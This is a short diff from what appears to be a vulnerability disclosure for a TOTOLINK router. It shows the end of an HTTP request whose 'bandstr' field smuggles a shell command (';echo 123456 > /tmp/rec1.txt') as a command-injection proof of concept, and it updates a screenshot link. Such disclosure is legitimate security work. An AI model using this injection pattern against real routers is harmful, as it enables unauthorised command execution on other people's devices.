@@ -56,7 +56,7 @@ Upgrade-Insecure-Requests: 1
 
 sessionCheck=eac3d25a37ff88c5d813f312586baec9&submit-url=%2Fmulti_ap_popup_client_details.htm&macstr=123&clientoff=no&bandstr=123;echo%20123456%20> /tmp/rec1.txt
 ```
-[![%DISPLAY_TITLE%](https://img.picgo.net/2025/03/26/poc7deff67770e22ffc.png)](https://www.picgo.net/image/poc.XX8Cm7)
+![poc](https://img.picgo.net/2025/03/26/poc7deff67770e22ffc.png)
 ![alt text](./img/poc.png)
 
 [1]:https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/258/ids/36.html
